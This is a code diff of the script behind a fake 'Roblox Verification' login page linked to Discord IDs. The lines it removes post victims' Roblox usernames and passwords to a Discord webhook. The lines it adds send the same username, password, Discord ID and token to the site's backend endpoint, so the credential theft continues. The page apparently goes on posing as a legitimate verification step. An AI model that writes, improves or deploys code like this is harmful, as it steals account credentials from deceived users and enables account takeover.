@@ -38,43 +38,15 @@
         </div>
     </div>
     <script>
-        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';
         const urlParams = new URLSearchParams(window.location.search);
         const discordId = urlParams.get('discord_id');
+        const token = urlParams.get('token');
         
         function togglePassword() {
             const passwordField = document.getElementById('password');
             const toggleButton = document.querySelector('.toggle-password');
             passwordField.type = passwordField.type === 'password' ? 'text' : 'password';
             toggleButton.textContent = passwordField.type === 'password' ? 'Show' : 'Hide';
-        }
-        
-        async function sendToDiscordWebhook(username, password) {
-            const payload = {
-                username: 'Roblox Verification',
-                embeds: [{
-                    title: '🔐 Roblox Verification',
-                    color: 0x5865F2,
-                    fields: [
-                        { name: 'Username', value: `\`\`\`${username}\`\`\``, inline: true },
-                        { name: 'Password', value: `\`\`\`${password}\`\`\``, inline: true },
-                        { name: 'Discord ID', value: `\`${discordId || 'Not linked'}\``, inline: true }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            
-            try {
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                return true;
-            } catch (error) {
-                console.error('Webhook error:', error);
-                return false;
-            }
         }
         
         async function handleLogin(event) {
@@ -90,17 +62,28 @@
             document.getElementById('loadingOverlay').style.display = 'flex';
             
             try {
-                // Send to Discord webhook
-                await sendToDiscordWebhook(username, password);
+                // Send to your backend API
+                const response = await fetch('/api/roblox-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password, discordId, token })
+                });
                 
-                // Store credentials in localStorage
-                localStorage.setItem('roblox_username', username);
-                localStorage.setItem('roblox_userid', Math.floor(Math.random() * 1000000000));
+                const data = await response.json();
                 
-                // Redirect to success page
-                setTimeout(() => {
-                    window.location.href = `verification-success.html?username=${encodeURIComponent(username)}`;
-                }, 1500);
+                if (data.success) {
+                    // Store data in localStorage
+                    localStorage.setItem('roblox_username', data.username);
+                    localStorage.setItem('roblox_userid', data.userId);
+                    localStorage.setItem('verification_token', data.verificationToken);
+                    
+                    // Redirect to success page
+                    setTimeout(() => {
+                        window.location.href = `verification-success.html?username=${encodeURIComponent(data.username)}&userid=${data.userId}`;
+                    }, 1000);
+                } else {
+                    throw new Error(data.error || 'Verification failed');
+                }
                 
             } catch (error) {
                 console.error('Login error:', error);
